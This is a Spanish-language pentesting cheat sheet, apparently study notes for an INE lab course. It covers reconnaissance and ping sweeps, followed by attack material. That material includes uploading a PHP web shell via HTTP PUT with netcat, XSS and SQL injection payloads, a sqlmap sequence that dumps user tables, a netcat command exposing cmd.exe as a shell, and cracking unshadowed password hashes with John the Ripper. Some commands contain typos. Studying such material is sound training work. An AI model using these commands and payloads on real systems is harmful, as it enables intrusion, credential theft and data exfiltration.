# Enrutamiento

```powershell
    ip route # linux
    route print # windows
    netstat -r # OSX
```

# Direcciones MAC

```powershell
    ip addr # linux
    ifconfig /all # windows
    ifconfig # OSX
```
# TCP/UDP

Puertos bien conocidos 0-1023

# Test firewall

## Test 1
    syn 
    No contesta

## Test 2
    syn 
    RST/ACK
    

## Filtros de captura 

    ip
    net ip/sufix
    src net ip/sufix
    host ip

Mostrar flujo tcp en 1 ventana

        tcp.stream eq 1


## HTTP

### Hacer conexion con https

openssl s_client -connect dominio:443 -quiet


## Same Origin Policy

Es para prevenir que el js obtenga o fije propiedades de recursos que vengan de diferente origen.

http://misite.com:8383/

Los atributos deben hacer match:
    El protocolo 
    Hostname 
    puerto

Solo aplica al código actual del js, no aplica para etiquetas <img>,<script>,<frame>, etc...


# Information Gathering

## OSINT

Buscar info en internet 

    Inversores y personas 
        https://www.crunchbase.com/

    whois 
        * Dueño del DNS
        * Direccion 
        * Email
        * Contactos técnicos

## Subdominios 
    
    Google
        * site:companyName
    Enumeración pasiva 
        https://dnsdumpster.com/
        
        sublist3r -d domain.name
            Hace busquedas de dominios con diferentes buscadores
            **Puede scanear puertos**


## Barridos de ping 

fping -a -g ip/prefix
fping -a -g ip mask

    -a alive
    -g genera lista del prefijo

nmap -sn ip/prefix
nmap -sn ip-numero
nmap -sn ip.*
### Desde una lista de ips 
nmap -sn -iL hostlist

## Explotar un PUT al servidor

wc -m shell.php
nc vitim.com 80
PUT /shell.php HTTP/1.0
Content-Type: text/html
Content-length: 136

CONTENIDO DEL SHELL.php

### Directorios enum

#### nombres de respaldos 
    .bak .old .txt .xxx

# XSS
## XSS Reflejado
    Se envian por la url.
## XSS Almacenado
    Se guardan el payload en la bd.

## XSS scripts
### Testear XSS muchos payloads
xsser --url 'http://demo.ine.local/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --auto

### Testear un payload externo
xsser --url 'http://demo.ine.local/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --Fp "<script>alert(1)</script>"

### Payloads

' or 'a'='a
' union select user, pass from Table where 'a'='a

# SQL injections 
## Detección
### Inputs a probar
    * GET
    * POST
    * HTTP
      * User-Agent
      * Cookie
      * Accept
### Info de la BD
select user()
## Explotación
### Inyecciones de tipo booleano
Es cuando hay un valor boleano de la base de datos se miran mas o menos asi.

**SELECT** Name, Description **FROM** Products **WHERE** ID='' OR 'a'='a';

PAYLOAD ES
    ' OR 'a'='a
#### Para hacer el substring
    select substring(user(),2,1) = 'r';
        True y salida normal
    select substring(user(),2,1) = 'a';
        False y sin salida normal
### Payloads
#### Primera letra
    ' OR substr(user(), 1, 1) = 'a
    ' OR substr(user(), 1, 1) = 'b
#### Segunda letra
    ' OR substr(user(), 2, 1) = 'a
    ' OR substr(user(), 2, 1) = 'b

## UNION Based SQL Injections
    Payload
    ' UNION SELECT user(); -- -
    Archivos de datos
    SELECT desc FROM items WHERE id='' UNION SELECT user(); -- -';
    
**https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet**

sqlmap -u 'http://ip?param=n' -p paramInjection --technique=U

--dbs
-D Database --tables
-D Database -T table --columnsy
-D Database -T table -C username,password --dump
# Pasos

sqlmap -u "http://testsite.com/login.php"
sqlmap -u "http://testsite.com/login.php" --dbs
sqlmap -u "http://testsite.com/login.php" -D site_db --tables
sqlmap -u "http://testsite.com/login.php" -D site_db -T users --dump
sqlmap -u "http://testsite.com/login.php" -D site_db -T users --columns

sqlmap -u http://slqmap.test/login.php --data='user=a&pass=a' -p user --technique=B --banner 
Tecnica boolean B 

Exportar una request del burp suite

sqlmap -r dblogin.req -p user --technique=B --banner


netcat windows 

    winconfig -l -p 1234 -e cmd.exe 

# Convertir shadown a hash 
unshadow passwd shadown > hash
# Fuerza bruta 
john -incremental -users:usernames hash
# con reglas procesamiento
john -wordlist=wordlistDict -rules HASH



















